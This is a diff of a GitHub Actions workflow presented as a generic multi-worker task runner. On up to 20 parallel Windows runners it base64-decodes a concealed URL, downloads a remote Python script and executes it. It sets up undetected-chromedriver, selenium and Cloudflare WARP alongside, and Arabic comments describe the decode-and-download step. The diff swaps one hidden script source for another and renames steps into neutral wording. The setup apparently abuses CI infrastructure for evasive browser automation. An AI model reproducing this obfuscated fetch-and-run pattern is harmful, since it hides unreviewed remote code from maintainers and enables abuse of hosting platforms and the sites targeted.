@@ -1,4 +1,4 @@
-name: Multi-Threaded Task Runner
+name: Ma3trix Aut544
 
 on:
   repository_dispatch:
@@ -6,65 +6,65 @@ on:
   workflow_dispatch:
 
 concurrency:
-  group: cluster-pool-${{ github.workflow }}-${{ github.ref }}
+  group: matrix-pool-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 jobs:
-  execute-workload:
-    name: "Client-${{ matrix.instance_id }}"
+  launch-workers:
+    name: "Agent-${{ matrix.node_index }}"
     runs-on: windows-2022
     timeout-minutes: 75
 
     strategy:
       fail-fast: false
       matrix:
-        instance_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        node_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14]
 
     steps:
-      - name: Provision Host & Fetch Target Script
+      - name: System Init & Dependency Setup
         shell: bash
         run: |
-          echo "[STATUS] Setting up Client-${{ matrix.instance_id }}..."
+          echo "[INITIALIZING] Setting up Worker-${{ matrix.node_index }}..."
           
-          # فك تشفير الرابط المصدر وتحميل ملف التشغيل
-          FETCH_SRC_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvbmdyaWsvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          # فك تشفير الرابط الجديد وتحميل الملف
+          REMOTE_SRC=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2NhY2EvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
           
-          curl -sL "$FETCH_SRC_URL" -o execute_app.py
+          curl -sL "$REMOTE_SRC" -o app_task.py
           
-          echo "[STATUS] Configuring environment packages..."
+          echo "[INITIALIZING] Fetching required packages..."
           python -m pip install -qU pip setuptools
           pip install -q undetected-chromedriver selenium requests
-          echo "[STATUS] Workspace readiness confirmed."
+          echo "[INITIALIZING] Environment setup completed."
 
-      - name: Trigger Process & Monitor Lifecycle
+      - name: Execute Script & Monitor Process
         shell: pwsh
         env:
           PYTHONIOENCODING: "utf-8"
         run: |
-          Write-Output ">>> Launching process on Client ${{ matrix.instance_id }}..."
+          Write-Output ">>> Launching process on node ${{ matrix.node_index }}..."
           
           $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
           
-          $ExecutionConfig = @{
+          $ProcessParams = @{
               FilePath     = "python"
-              ArgumentList = "execute_app.py"
+              ArgumentList = "app_task.py"
               PassThru     = $true
               NoNewWindow  = $true
           }
-          $RunningTask = Start-Process @ExecutionConfig
+          $WorkerProc = Start-Process @ProcessParams
           
-          Write-Output ">>> Safety timeout handler active (74m maximum)."
+          Write-Output ">>> Supervisor online. Enforcing maximum runtime: 74 minutes."
           
           try {
-              Wait-Process -InputObject $RunningTask -Timeout 4440 -ErrorAction Stop
-              Write-Output ">>> Task completed smoothly within limits."
+              Wait-Process -InputObject $WorkerProc -Timeout 4440 -ErrorAction Stop
+              Write-Output ">>> Process finished execution within limit."
           }
           catch {
-              Write-Output ">>> Execution window expired! Forcing shutdown..."
-              Stop-Process -InputObject $RunningTask -Force
-              Write-Output ">>> Process terminated by watchdog."
+              Write-Output ">>> Execution threshold met! Killing process..."
+              Stop-Process -InputObject $WorkerProc -Force
+              Write-Output ">>> Process terminated successfully."
           }
 
-      - name: Cleanup Step
+      - name: Completion Status
         shell: bash
-        run: echo "[STATUS] Client-${{ matrix.instance_id }} operations finished."
+        run: echo "[COMPLETE] Worker-${{ matrix.node_index }} finished execution cycle."
